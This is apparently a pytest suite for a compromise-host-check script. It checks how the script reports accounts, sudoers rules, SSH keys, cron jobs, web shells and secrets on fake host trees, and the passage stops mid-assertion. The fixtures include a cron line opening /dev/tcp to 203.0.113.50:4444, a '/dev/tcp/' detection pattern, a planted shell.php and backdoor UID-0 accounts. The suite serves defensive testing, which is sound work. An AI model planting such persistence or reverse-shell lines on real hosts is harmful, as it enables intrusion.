import os
import re
import shutil
import subprocess
import threading
import time
from dataclasses import dataclass
from hashlib import sha256
from pathlib import Path
from typing import cast
from urllib.parse import unquote_to_bytes

import pytest

from tests.skill_scripts import SKILLS, doc_blocks, install_fakes, toolbox

REFERENCE = 'compromise-host-check/references/collect.md'
MAPPING = SKILLS / 'compromise-host-check/references/attack-mapping.md'
COLLECT = SKILLS / REFERENCE
SINCE = '2026-08-03'
NEEDS_PROC_FD = pytest.mark.skipif(
    not Path('/proc/self/fd').is_dir(), reason='needs /proc/self/fd'
)
BEFORE = 1_754_000_000
AFTER = 1_789_000_000
REAL_TOOLS = (
    'awk',
    'cat',
    'grep',
    'od',
    'readlink',
    'sha256sum',
    'sort',
    'stat',
    'tr',
    'wc',
    'xargs',
)
FAKES = {
    'date': 'printf \'%s\\n\' "${NOW:-1789000000}"',
    'id': 'printf \'%s\\n\' "${UID_OUT:-0}"',
    'ss': """case " $* " in
  (*' state established '*) printf '%s\\n' "$SS_EST" ;;
  (*' -l'*) printf '%s\\n' "$SS_LISTEN" ;;
esac
exit "${SS_EXIT:-0}"
""",
    'dpkg': """[ -z "$DPKG_LOG" ] || printf '%s\\n' "$*" >> "$DPKG_LOG"
case "$1" in
  (-S|--search) printf '%s\\n' "$DPKG_SEARCH_OUT"; exit "${DPKG_SEARCH_EXIT:-1}";;
  (--get-selections) printf '%s\\n' "$DPKG_SELECTIONS"; exit "${DPKG_SELECTIONS_EXIT:-0}";;
  (--listfiles) printf '%s\\n' "$DPKG_LISTFILES"; exit "${DPKG_LISTFILES_EXIT:-0}";;
  (--verify) printf '%s\\n' "$DPKG_OUT"; exit "${DPKG_EXIT:-0}";;
esac""",
    'rpm': """[ -z "$RPM_LOG" ] || printf '%s\\n' "$*" >> "$RPM_LOG"
case "$1" in
  (-qf) printf '%s\\n' "$RPM_QUERY_OUT"; exit "${RPM_QUERY_EXIT:-1}";;
  (-Va) printf '%s\\n' "$RPM_OUT"; exit "${RPM_EXIT:-0}";;
esac""",
    'last': 'printf \'%s\\n\' "$*" >> "$LAST_LOG"; printf \'%s\\n\' "$LAST_OUT"; exit "${LAST_EXIT:-0}"',
    'ssh-keygen': """line=$(cat)
printf '%s\\n' "$line" >> "$KEYGEN_LOG"
set -- $line
blob=$2
printf '256 SHA256:%.8s %s (ED25519)\\n' "$blob" "${3:-no comment}"
""",
}

pytestmark = pytest.mark.parametrize('shell', ['sh', 'bash'])


@dataclass(frozen=True)
class Run:
    code: int
    lines: list[str]
    stderr: str

    def records(self, kind: str) -> list[dict[str, str]]:
        return [
            _parse_record(line) for line in self.lines if line.split(' ', 1)[0] == kind
        ]


def _parse_record(line: str) -> dict[str, str]:
    fields = line.split(' ')
    return {'kind': fields[0]} | dict(field.split('=', 1) for field in fields[1:])


def _script() -> str:
    blocks = doc_blocks(REFERENCE, 'sh')
    assert len(blocks) == 1
    return blocks[0]


def _catalog(text: str | None = None) -> dict[str, tuple[str, ...]]:
    source = text if text is not None else COLLECT.read_text()
    source = source.split('This table is the canonical kind and field catalog.', 1)[1]
    source = source.split('\n## ', 1)[0]
    rows: dict[str, tuple[str, ...]] = {}
    for line in source.splitlines():
        cells = [cell.strip() for cell in line.strip('|').split('|')]
        if len(cells) != 3 or not re.fullmatch(r'`[a-z_]+`', cells[0]):
            continue
        kind = cells[0].strip('`')
        fields = cells[1].split(' or ', 1)[0].strip('`')
        rows[kind] = tuple(fields.split())
    assert rows
    return rows


def _mapping_kinds(text: str | None = None) -> set[str]:
    source = text if text is not None else MAPPING.read_text()
    return set(re.findall(r'^\| `([a-z_]+)` \|', source, re.M))


def _static_kinds(script: str | None = None) -> set[str]:
    source = script if script is not None else _script()
    for path in sorted((COLLECT.parent / 'apps').glob('*.md')):
        source += '\n' + '\n'.join(doc_blocks(str(path.relative_to(SKILLS)), 'sh'))
    literal = set(
        re.findall(
            r'\b(?:emit|record|begin_kind|not_requested) +([a-z_]+)(?=\s|$)', source
        )
    )
    if '"cap kind="' in source:
        literal.add('cap')
    literal.discard('__done')
    return literal


def _host_tree(tmp_path: Path) -> Path:
    root = tmp_path / 'host'
    files = {
        'etc/passwd': 'root:x:0:0:root:/root:/bin/sh\nalice:x:1000:1000:Alice:/home/alice:/bin/sh\n',
        'etc/shadow': 'root:*:20000:0:99999:7:::\nalice:$6$fixture:20700:0:99999:7:::\n',
        'etc/login.defs': 'UID_MIN 1000\nUID_MAX 60000\n',
        'etc/sudoers': 'root ALL=(ALL:ALL) ALL\n',
        'proc/self/mountinfo': '1 0 0:1 / / rw,relatime - ext4 /dev/root rw\n2 1 0:1 /app /app rw,noatime - ext4 /dev/root rw\n',
        'var/log/wtmp': '',
    }
    for relative, content in files.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
    for relative in (
        'etc/sudoers.d',
        'etc/cron.d',
        'etc/cron.daily',
        'etc/systemd/system',
        'run/systemd/system',
        'usr/lib/systemd/system',
        'usr/local/lib/systemd/system',
        'var/spool/cron',
        'var/www/html',
        'home/alice/.ssh',
        'root/.ssh',
        'app',
        'proc',
    ):
        (root / relative).mkdir(parents=True, exist_ok=True)
    return root


def _write(root: Path, relative: str, content: str, when: int = AFTER) -> Path:
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)
    os.utime(path, (when, when))
    return path


def _collect(
    tmp_path: Path,
    shell: str,
    root: Path,
    *args: str,
    tools: tuple[str, ...] = ('ss', 'dpkg', 'last', 'ssh-keygen'),
    awk: str = 'awk',
    extra_fakes: dict[str, str] | None = None,
    sealed: bool = False,
    **env: str,
) -> Run:
    tmp_path.mkdir(parents=True, exist_ok=True)
    script = _script()
    replaced, count = re.subn(r'^R=$', f"R='{root}'", script, count=1, flags=re.M)
    assert count == 1
    script_path = tmp_path / f'check-script-{shell}.sh'
    script_path.write_text(replaced)
    fake_dir = tmp_path / f'fake-{shell}'
    real_dir = tmp_path / f'real-{shell}'
    fake_names = ('date', 'id', *tools)
    selected_fakes = {name: FAKES[name] for name in fake_names}
    selected_fakes.update(extra_fakes or {})
    install_fakes(fake_dir, selected_fakes)
    path = str(fake_dir) + os.pathsep + toolbox(real_dir, REAL_TOOLS)
    if awk != 'awk':
        alternate = shutil.which(awk)
        if alternate is None:
            pytest.skip(f'{awk} is not installed')
        (real_dir / 'awk').unlink()
        (real_dir / 'awk').symlink_to(Path(alternate).resolve())
    logs = {
        'LAST_LOG': str(tmp_path / 'last.log'),
        'KEYGEN_LOG': str(tmp_path / 'keygen.log'),
    }
    entry, fds = str(script_path), cast(tuple[int, ...], ())
    if sealed:  # alpamon runs a verified file from an unlinked sealed copy
        fd = os.open(script_path, os.O_RDONLY)
        script_path.unlink()
        entry, fds = f'/proc/self/fd/{fd}', (fd,)
    try:
        result = subprocess.run(  # noqa: S603  # documented script against isolated fakes
            [f'/bin/{shell}', entry, *args],
            env={**os.environ, 'PATH': path, **logs, **env},
            capture_output=True,
            check=False,
            text=True,
            timeout=30,
            pass_fds=fds,
        )
    finally:
        for fd in fds:
            os.close(fd)
    return Run(result.returncode, result.stdout.splitlines(), result.stderr)


JOURNALCTL = """case " $* " in
  (*' _COMM=sshd '*) printf '%s\\n' "$JOURNAL_SSHD";;
  (*) printf '%s\\n' "$JOURNAL_JSON";;
esac"""


def _inspect_host(tmp_path: Path, shell: str, *targets: str) -> Run:
    root = _host_tree(tmp_path)
    _write(root, 'usr/local/bin/beacon', 'binary\n')
    _write(
        root,
        'etc/systemd/system/beacon.service',
        '[Service]\nExecStartPre=-/usr/local/bin/beacon --token=hunter2\n'
        'ExecStart=/usr/local/bin/beacon --password=hunter2\n',
    )
    _write(
        root,
        'etc/cron.d/beacon',
        'MAILTO=root\n*/5 * * * * root /usr/local/bin/beacon --key=hunter2\n'
        '@reboot root /usr/local/bin/beacon\n',
    )
    _write(
        root,
        'home/alice/.ssh/authorized_keys',
        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5fixture note\n',
    )
    _write(root, 'proc/4121/comm', 'beacon\n')
    (root / 'proc/4121/exe').symlink_to(root / 'usr/local/bin/beacon')
    _write(root, 'proc/4121/stat', '4121 (bea con) S 900 4121 4121 0\n')
    _write(root, 'proc/900/comm', 'bash\n')
    _write(root, 'proc/900/stat', '900 (bash) S 1 900 900 0\n')
    _write(root, 'proc/1/comm', 'systemd\n')
    _write(root, 'proc/1/stat', '1 (systemd) S 0 1 1 0\n')
    return _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        *(
            targets
            or (
                'inspect=/etc/systemd/system/beacon.service',
                'inspect=/etc/cron.d/beacon',
                'inspect=/home/alice/.ssh/authorized_keys',
                'inspect=/proc/4121',
            )
        ),
        extra_fakes={'journalctl': JOURNALCTL},
        JOURNAL_JSON='{"_COMM":"bash","_SYSTEMD_UNIT":"session-3.scope","MESSAGE":"hunter2"}\n'
        '{"_COMM":"bash","_SYSTEMD_UNIT":"session-3.scope"}',
        JOURNAL_SSHD='1789000000.5 host sshd[7]: Accepted publickey for alice from '
        '203.0.113.9 port 51000 ssh2: ED25519 SHA256:AAAAC3Nz',
    )


def _record_value(record: dict[str, str], key: str) -> bytes:
    return unquote_to_bytes(record[key])


def _full_host(tmp_path: Path, shell: str) -> Run:
    root = _host_tree(tmp_path)
    _write(root, 'app/.env', 'secret\n')
    _write(
        root,
        'home/alice/.ssh/authorized_keys',
        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAfixture note\n',
    )
    _write(root, 'etc/cron.d/beacon', '* * * * * root /dev/tcp/203.0.113.50/4444\n')
    _write(
        root, 'etc/systemd/system/beacon.service', '[Service]\nExecStart=/bin/true\n'
    )
    _write(root, 'etc/rc.local', '#!/bin/sh\n/bin/true\n')
    _write(root, 'var/www/html/shell.php', '<?php echo 1; ?>\n')
    _write(root, 'proc/20/comm', 'beacon\n')
    (root / 'proc/20/exe').symlink_to('/dev/shm/beacon (deleted)')
    package_rows = '\n'.join(
        f'??5?????? /usr/bin/changed-{index}' for index in range(201)
    )
    return _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'webroot=/missing',
        'webroot=/var/www/html',
        'protect=/app/.env',
        'pattern=/dev/tcp/',
        SS_LISTEN='LISTEN 0 128 0.0.0.0:443 0.0.0.0:* users:(("server",pid=10,fd=3))',
        SS_EST='ESTAB 0 0 10.0.0.1:50000 203.0.113.50:4444 users:(("fake",pid=20,fd=4))',
        DPKG_OUT=package_rows,
        LAST_OUT=(
            'alice pts/0 203.0.113.50 2026-09-14T03:11:02+00:00 - 2026-09-14T03:15:00+00:00\n'
            'wtmp begins 2026-07-01T00:00:00+00:00'
        ),
    )


def _run_app(
    tmp_path: Path,
    shell: str,
    app: str,
    fakes: dict[str, str] | None = None,
    **env: str,
) -> Run:
    script = doc_blocks(f'compromise-host-check/references/apps/{app}.md', 'sh')[0]
    script_path = tmp_path / f'{app}-{shell}.sh'
    script_path.write_text(script)
    fake_dir = tmp_path / f'{app}-fake-{shell}'
    real_dir = tmp_path / f'{app}-real-{shell}'
    install_fakes(fake_dir, fakes or {})
    result = subprocess.run(  # noqa: S603  # documented script against isolated fakes
        [f'/bin/{shell}', script_path],
        env={
            **os.environ,
            'PATH': str(fake_dir) + os.pathsep + toolbox(real_dir, ('awk',)),
            **env,
        },
        capture_output=True,
        check=False,
        text=True,
        timeout=10,
    )
    return Run(result.returncode, result.stdout.splitlines(), result.stderr)


def _assert_catalogs_match(
    collect_text: str, mapping_text: str, script_text: str
) -> None:
    catalog = set(_catalog(collect_text))
    assert _mapping_kinds(mapping_text) == catalog
    assert _static_kinds(script_text) == catalog


def test_mapping_rows_are_exactly_the_kinds_the_script_can_emit(shell: str):
    _assert_catalogs_match(COLLECT.read_text(), MAPPING.read_text(), _script())


def test_a_full_host_emits_every_kind_the_mapping_names(tmp_path: Path, shell: str):
    results = [
        _full_host(tmp_path / 'full', shell),
        _inspect_host(tmp_path / 'inspect', shell),
    ]

    emitted = {line.split(' ', 1)[0] for result in results for line in result.lines}
    expected = _mapping_kinds() - {'app_account'}
    assert emitted == expected


def test_each_kind_prints_the_fields_collect_md_lists(tmp_path: Path, shell: str):
    results = [
        _full_host(tmp_path / 'full', shell),
        _inspect_host(tmp_path / 'inspect', shell),
    ]
    catalog = _catalog()

    for line in [line for result in results for line in result.lines]:
        parts = line.split(' ')
        kind = parts[0]
        keys = tuple(part.split('=', 1)[0] for part in parts[1:])
        expected = catalog[kind]
        if kind == 'end' and 'arg=' in line:
            expected = ('status', 'arg', 'reason')
        assert keys == expected, line


def test_catalog_comparison_rejects_a_kind_added_to_one_side(shell: str):
    mapping = MAPPING.read_text() + '\n| `invented` | none | never | always |\n'

    with pytest.raises(AssertionError):
        _assert_catalogs_match(COLLECT.read_text(), mapping, _script())


def test_catalog_comparison_rejects_a_kind_removed_from_one_side(shell: str):
    kind = next(iter(_catalog()))
    mapping = re.sub(rf'^\| `{kind}` \|.*\n', '', MAPPING.read_text(), flags=re.M)

    with pytest.raises(AssertionError):
        _assert_catalogs_match(COLLECT.read_text(), mapping, _script())


def test_catalog_comparison_rejects_a_kind_added_to_the_script(shell: str):
    script = _script() + '\nemit invented value x\n'

    with pytest.raises(AssertionError):
        _assert_catalogs_match(COLLECT.read_text(), MAPPING.read_text(), script)


def test_catalog_comparison_rejects_a_kind_removed_from_the_script(shell: str):
    script = _script().replace('emit run v 1', 'emit v 1', 1)

    with pytest.raises(AssertionError):
        _assert_catalogs_match(COLLECT.read_text(), MAPPING.read_text(), script)


def test_mapping_states_its_attack_release_first(shell: str):
    lines = MAPPING.read_text().splitlines()

    assert lines[2] == 'ATT&CK Enterprise v20.1 (2026-10-13)'


def test_the_script_fits_execute_file(shell: str):
    script_bytes = _script().encode()

    assert len(script_bytes) < 65_536


def test_every_host_path_starts_at_r(shell: str):
    paths = re.findall(
        r'(?:\[\s+(?:!\s+)?-[erfdL]|<|stat\b[^\n]*--|find\s+-P)\s+["\'](/(?:etc|var|home|root|proc|run|usr|lib)[^"\']*)',
        _script(),
    )

    assert paths == []


def test_the_script_writes_no_file(shell: str):
    script = _script()

    assert not re.search(
        r'(^|[;&|()]\s*)(rm|cp|mv|tee|touch|mkdir|sudo|chmod|chown)(\s|$)', script
    )
    assert not re.search(
        r'(?:^|[\s;|&])>(?![=>&]|\s*/dev/null)\s*["$A-Za-z/]', script, re.M
    )


def test_only_one_file_holds_the_check_script(shell: str):
    owners = []
    for path in (SKILLS.parents[2] / 'plugins').rglob('*.md'):
        for block in re.findall(r'```sh\n(.*?)```', path.read_text(), re.S):
            if 'emit end' in block:
                owners.append(path)

    assert owners == [COLLECT]


def test_app_scripts_share_the_check_scripts_escape_byte_for_byte(shell: str):
    check_lib = re.search(r"^LIB='\n(.*?)\n'\n", _script(), re.M | re.S)
    assert check_lib

    for path in sorted((COLLECT.parent / 'apps').glob('*.md')):
        block = doc_blocks(str(path.relative_to(SKILLS)), 'sh')[0]
        app_lib = re.search(r"^LIB='\n(.*?)\n'\n", block, re.M | re.S)
        assert app_lib
        assert app_lib.group(0) == check_lib.group(0)


def test_zimbra_app_script_emits_accounts_without_credentials(
    tmp_path: Path, shell: str
):
    result = _run_app(
        tmp_path,
        shell,
        'zimbra',
        {'zmprov': "printf '%s\\n' 'admin@example.com' 'backdoor@example.com'"},
    )

    assert result.code == 0, result.stderr
    assert result.records('app_account') == [
        {
            'kind': 'app_account',
            'application': 'zimbra',
            'name': 'admin@example.com',
            'created': '?',
            'type': 'account',
        },
        {
            'kind': 'app_account',
            'application': 'zimbra',
            'name': 'backdoor@example.com',
            'created': '?',
            'type': 'account',
        },
    ]
    assert any(
        row['reason'] == 'command-needs-real-install-verification'
        for row in result.records('unknown')
    )


def test_mysql_app_script_emits_names_without_password_metadata(
    tmp_path: Path, shell: str
):
    log = tmp_path / 'mysql.log'
    result = _run_app(
        tmp_path,
        shell,
        'mysql',
        {
            'mysql': 'printf \'%s\\n\' "$*" > "$MYSQL_LOG"; printf \'xadmin\\tlocalhost\\n\''
        },
        MYSQL_LOG=str(log),
    )

    assert result.code == 0, result.stderr
    assert result.records('app_account') == [
        {
            'kind': 'app_account',
            'application': 'mysql',
            'name': 'xadmin@localhost',
            'created': '?',
            'type': 'account',
        }
    ]
    assert result.records('unknown') == [
        {
            'kind': 'app_account',
            'path': 'mysql',
            'reason': 'creation-time-unavailable',
        }
    ]
    call = log.read_text()
    assert '--no-defaults' in call
    assert '--protocol=SOCKET' in call
    assert '--host=localhost' in call


def test_nacos_app_script_is_explicitly_unknown_until_credential_delivery_is_verified(
    tmp_path: Path, shell: str
):
    result = _run_app(tmp_path, shell, 'nacos')

    assert result.code == 0, result.stderr
    assert result.records('unknown') == [
        {
            'kind': 'app_account',
            'path': 'nacos',
            'reason': 'command-needs-real-install-verification',
        }
    ]


def test_secrets_are_statted_before_any_non_argument_file_is_read(shell: str):
    main = re.search(r'^main\(\) \{\n(.*?)^\}', _script(), re.M | re.S)
    assert main
    body = main.group(1)
    snapshots = [
        match.start() for match in re.finditer(r'^\s*snapshot_secrets$', body, re.M)
    ]

    assert len(snapshots) == 2
    assert snapshots[0] < body.index('load_accounts') < snapshots[1]
    assert snapshots[1] < body.index('collect_secrets')


def test_refuses_a_run_without_since(tmp_path: Path, shell: str):
    result = _collect(tmp_path, shell, _host_tree(tmp_path))

    assert result.code == 2
    assert result.lines == ['end status=refused arg=0 reason=no-since']


def _assert_refused(tmp_path: Path, shell: str, *args: str) -> None:
    result = _collect(tmp_path, shell, _host_tree(tmp_path), *args)

    assert result.code == 2
    assert result.lines[-1].startswith('end status=refused ')
    assert len(result.lines) == 1


def test_refuses_an_unknown_key(tmp_path: Path, shell: str):
    _assert_refused(tmp_path, shell, f'since={SINCE}', 'other=value')


def test_refuses_a_relative_webroot(tmp_path: Path, shell: str):
    _assert_refused(tmp_path, shell, f'since={SINCE}', 'webroot=relative')


def test_refuses_a_value_with_a_newline(tmp_path: Path, shell: str):
    _assert_refused(tmp_path, shell, f'since={SINCE}', 'pattern=line\nbreak')


def test_refuses_every_control_byte_that_an_argv_can_hold(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    for value in [chr(number) for number in range(1, 32)] + ['\x7f']:
        result = _collect(
            tmp_path / f'control-{ord(value)}',
            shell,
            root,
            f'since={SINCE}',
            f'pattern=x{value}y',
        )
        assert result.code == 2, ord(value)
        assert result.lines[-1].startswith('end status=refused '), ord(value)


def test_refuses_a_second_since(tmp_path: Path, shell: str):
    _assert_refused(tmp_path, shell, f'since={SINCE}', 'since=2026-08-04')


def test_refuses_an_impossible_date(tmp_path: Path, shell: str):
    _assert_refused(tmp_path, shell, 'since=2026-02-30')


def test_a_pattern_starting_with_a_dash_is_data_not_an_option(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'etc/cron.d/job', '* * * * * root printf -- -e\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'pattern=-e')

    assert result.code == 0, result.stderr
    assert result.records('cron')[0]['hits'] == '1@1'


def test_a_username_with_tab_space_percent_and_equals_round_trips(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    username = 'x\t a%=b'
    (root / 'etc/passwd').write_text(
        f'root:x:0:0:root:/root:/bin/sh\n{username}:x:1001:1001:X:/home/x:/bin/sh\n'
    )
    (root / 'etc/shadow').write_text('root:*:20000::::::\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    records = [row for row in result.records('account') if row['uid'] == '1001']
    assert len(records) == 1
    assert _record_value(records[0], 'name') == username.encode()


def test_terminal_escapes_and_high_bytes_are_encoded(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    passwd = root / 'etc/passwd'
    passwd.write_bytes(
        passwd.read_bytes() + b'bad\x1b[31m\xff:x:1002:1002:X:/home/bad:/bin/sh\n'
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    raw = next(
        line
        for line in result.lines
        if line.startswith('account ') and 'uid=1002' in line
    )
    assert '\x1b' not in raw
    assert '%1B' in raw
    assert '%FF' in raw


@pytest.mark.parametrize('awk_name', ['mawk', 'gawk', 'busybox'])
def test_escape_bytes_are_portable_across_awk_implementations(
    tmp_path: Path, shell: str, awk_name: str
):
    root = _host_tree(tmp_path)
    passwd = root / 'etc/passwd'
    passwd.write_bytes(
        passwd.read_bytes() + b'bad\xff:x:1002:1002:X:/home/bad:/bin/sh\n'
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}', awk=awk_name)

    raw = next(
        line
        for line in result.lines
        if line.startswith('account ') and 'uid=1002' in line
    )
    assert '%FF' in raw


def test_unreadable_is_question_mark_and_a_literal_question_mark_is_encoded(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    shadow = root / 'etc/shadow'
    shadow.chmod(0)
    (root / 'etc/passwd').write_text('who?:x:1000:1000:X:/home/who:/bin/sh\n')

    try:
        result = _collect(tmp_path, shell, root, f'since={SINCE}', UID_OUT='1000')
    finally:
        shadow.chmod(0o600)

    account = result.records('account')[0]
    assert account['name'] == 'who%3F'
    assert account['password'] == '?'


def test_bash_and_sh_print_the_same_bytes(tmp_path: Path, shell: str):
    if shell == 'bash':
        pytest.skip('the sh parametrization compares both shells once')
    root = _host_tree(tmp_path)
    args = (f'since={SINCE}',)

    sh_result = _collect(tmp_path / 'sh-run', 'sh', root, *args)
    bash_result = _collect(tmp_path / 'bash-run', 'bash', root, *args)

    assert sh_result.lines == bash_result.lines


def test_lists_every_account_and_classifies_nologin_system_accounts(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    (root / 'etc/passwd').write_text(
        'root:x:0:0:root:/root:/bin/sh\n'
        'human:x:1000:1000:X:/home/human:/bin/bash\n'
        'daemon:x:2:2:X:/var/empty:/usr/sbin/nologin\n'
        'operator:x:500:500:X:/home/operator:/bin/sh\n'
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    accounts = {row['name']: row['class'] for row in result.records('account')}
    assert accounts == {
        'root': 'root',
        'human': 'human',
        'daemon': 'system-nologin',
        'operator': 'system-login',
    }


def test_a_second_uid_0_account_is_class_root(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    with (root / 'etc/passwd').open('a') as passwd:
        passwd.write('backdoor:x:0:0:X:/root:/bin/sh\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    account = next(
        row for row in result.records('account') if row['name'] == 'backdoor'
    )
    assert account['class'] == 'root'


def test_a_zero_padded_uid_0_account_is_class_root(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    with (root / 'etc/passwd').open('a') as passwd:
        passwd.write('xadmin:x:00:0:X:/root:/usr/sbin/nologin\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    account = next(row for row in result.records('account') if row['name'] == 'xadmin')
    assert account['class'] == 'root'


def test_reads_uid_min_from_login_defs(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    (root / 'etc/login.defs').write_text('UID_MIN 2000\nUID_MAX 60000\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    alice = next(row for row in result.records('account') if row['name'] == 'alice')
    assert alice['class'] == 'system-login'


def test_password_status_never_prints_the_hash(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    secret_hash = '$6$never-print-this-hash'
    (root / 'etc/shadow').write_text(
        f'root:*:20000::::::\nalice:{secret_hash}:20700::::::\n'
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert secret_hash not in '\n'.join(result.lines)
    alice = next(row for row in result.records('account') if row['name'] == 'alice')
    assert alice['password'] == 'set'


def test_an_empty_passwd_password_field_is_none_even_when_shadow_is_locked(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    (root / 'etc/passwd').write_text('xadmin::1001:1001:X:/home/xadmin:/bin/sh\n')
    (root / 'etc/shadow').write_text('xadmin:!:20700:0:99999:7:::\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert result.records('account')[0]['password'] == 'none'


def test_a_nologin_system_account_keeps_its_owned_artifacts(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    with (root / 'etc/passwd').open('a') as passwd:
        passwd.write('worker:x:50:50:X:/var/lib/worker:/usr/sbin/nologin\n')
    _write(root, 'var/lib/worker/.ssh/authorized_keys', 'ssh-ed25519 AAAAworker\n')
    _write(
        root,
        'var/lib/worker/.config/systemd/user/config.service',
        '[Service]\nExecStart=/bin/true\n',
    )
    _write(
        root,
        'var/lib/worker/.local/share/systemd/user/data.service',
        '[Service]\nExecStart=/bin/true\n',
    )
    _write(root, 'var/lib/worker/.token', 'never-print\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'protect=~/.token')

    assert any(row['account'] == 'worker' for row in result.records('authkey'))
    assert {
        row['account']
        for row in result.records('systemd_unit')
        if row['path'].endswith(('config.service', 'data.service'))
    } == {'worker'}
    assert any(row['account'] == 'worker' for row in result.records('secret'))


def test_an_unreadable_shadow_is_unknown_not_none(tmp_path: Path, shell: str):
    if os.geteuid() == 0:
        pytest.skip('root can read a mode-000 shadow fixture')
    root = _host_tree(tmp_path)
    shadow = root / 'etc/shadow'
    shadow.chmod(0)

    try:
        result = _collect(tmp_path, shell, root, f'since={SINCE}')
    finally:
        shadow.chmod(0o600)

    assert {row['password'] for row in result.records('account')} == {'?'}
    assert any(row['kind'] == 'account' for row in result.records('unknown'))


def test_sudoers_entry_shows_principal_and_nopasswd_without_its_command(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    command = '/bin/sh -c secret-command'
    _write(root, 'etc/sudoers.d/operator', f'alice ALL=(root) NOPASSWD: {command}\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    sudoers = next(
        row for row in result.records('sudoers') if row['principal'] == 'alice'
    )
    assert sudoers['nopasswd'] == 'yes'
    assert command not in '\n'.join(result.lines)


def test_a_sudoers_continuation_is_one_rule_without_command_tokens(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    command = '/usr/bin/secret-command --token never-print'
    _write(
        root,
        'etc/sudoers.d/operator',
        f'alice ALL=(root) NOPASSWD: \\\n+    {command}\n',
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    rows = [row for row in result.records('sudoers') if row['principal'] == 'alice']
    assert len(rows) == 1
    assert rows[0]['nopasswd'] == 'yes'
    assert command not in '\n'.join(result.lines)


def test_an_includedir_outside_sudoers_d_is_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    (root / 'etc/sudoers').write_text('@includedir /opt/sudoers\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert any(
        row['reason'] == 'include-outside-default' for row in result.records('unknown')
    )


def test_authorized_key_fingerprint_carries_no_comment(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAfixture attacker@evil\n'
    _write(root, 'home/alice/.ssh/authorized_keys', key)

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    log = (tmp_path / 'keygen.log').read_text()
    assert log.strip() == 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAfixture'
    assert 'attacker@evil' not in '\n'.join(result.lines)
    assert result.records('authkey')[0]['fp'] == 'SHA256:AAAAC3Nz'


def test_a_key_with_from_or_command_options_is_flagged(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    key = 'from="203.0.113.1",command="id",no-pty ssh-ed25519 AAAAfixture note\n'
    _write(root, 'home/alice/.ssh/authorized_keys', key)

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    authkey = result.records('authkey')[0]
    assert authkey['options'] == 'command,from,no-pty'
    assert '203.0.113.1' not in '\n'.join(result.lines)


def test_authorized_key_option_values_cannot_inject_names_or_key_material(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    key = (
        'command="echo safe,NEVER_PRINT \\"ssh-ed25519 AAAAFAKE\\"",'
        'from="203.0.113.1",no-pty ssh-ed25519 AAAAREAL attacker@evil\n'
    )
    _write(root, 'home/alice/.ssh/authorized_keys', key)

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    authkey = result.records('authkey')[0]
    assert authkey['options'] == 'command,from,no-pty'
    assert (tmp_path / 'keygen.log').read_text().strip() == 'ssh-ed25519 AAAAREAL'
    output = '\n'.join(result.lines)
    assert 'NEVER_PRINT' not in output
    assert 'AAAAFAKE' not in output
    assert '203.0.113.1' not in output
    assert 'attacker@evil' not in output


def test_a_non_default_authorized_keys_file_is_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'etc/ssh/sshd_config', 'AuthorizedKeysFile /etc/keys/%u\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert any(
        row['kind'] == 'authkey' and row['reason'] == 'non-default-authorized-keys-file'
        for row in result.records('unknown')
    )


def test_an_extra_authorized_keys_file_after_the_default_is_unknown(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(
        root,
        'etc/ssh/sshd_config',
        'AuthorizedKeysFile .ssh/authorized_keys .ssh/backdoor_keys\n',
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert any(
        row['kind'] == 'authkey' and row['reason'] == 'non-default-authorized-keys-file'
        for row in result.records('unknown')
    )


def test_a_home_that_cannot_be_searched_is_unknown_not_empty(
    tmp_path: Path, shell: str
):
    if os.geteuid() == 0:
        pytest.skip('root can search a mode-000 home fixture')
    root = _host_tree(tmp_path)
    home = root / 'home/alice'
    home.chmod(0)
    try:
        result = _collect(tmp_path, shell, root, f'since={SINCE}')
    finally:
        home.chmod(0o700)

    assert any(
